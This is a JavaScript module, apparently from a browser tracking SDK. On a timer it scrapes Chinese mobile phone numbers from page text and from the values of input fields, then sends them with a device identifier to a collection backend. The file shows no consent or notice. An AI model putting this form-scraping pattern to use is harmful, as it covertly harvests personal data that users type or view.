import Interval from '../../common/interval'

export default class PhoneList extends Interval {
  constructor (ctx) {
    super(ctx.config.phoneListDelay, 'phoneList')

    this.ctx = ctx
    this.sender = ctx.sender
    this.params = ctx.params
    this.phoneLists = []
  }

  async code () {
    let phoneList = []

    let numbers = document.body.innerText.match(/[0-9]+/g) || []
    for (let i = 0; i < numbers.length; i++) {
      if (phoneList.indexOf(numbers[i]) === -1 && /^1[34578]\d{9}$/.test(numbers[i])) {
        phoneList.push(numbers[i])
      }
    }

    let inputs = document.getElementsByTagName('input') || []
    for (let j = 0; j < inputs.length; j++) {
      if (phoneList.indexOf(inputs[j]._value) === -1 && /^1[34578]\d{9}$/.test(inputs[j]._value)) {
        phoneList.push(inputs[j]._value)
      }
    }

    if (phoneList.length > 0) {
      console.log('采集到phone list')
      let phoneListStr = phoneList.join(',')
      if (this.phoneLists.indexOf(phoneListStr) === -1) {
        console.log('new phone list')
        this.phoneLists.push(phoneListStr)

        let phoneListEvent = this.params.getEvent({
          type: 'phonelist',
          data: phoneList
        })
        this.params.getHeader()
        await this.sender.send({
          device: this.params.device,
          header: this.params.header,
          event: phoneListEvent
        })
      }
    }
  }

}
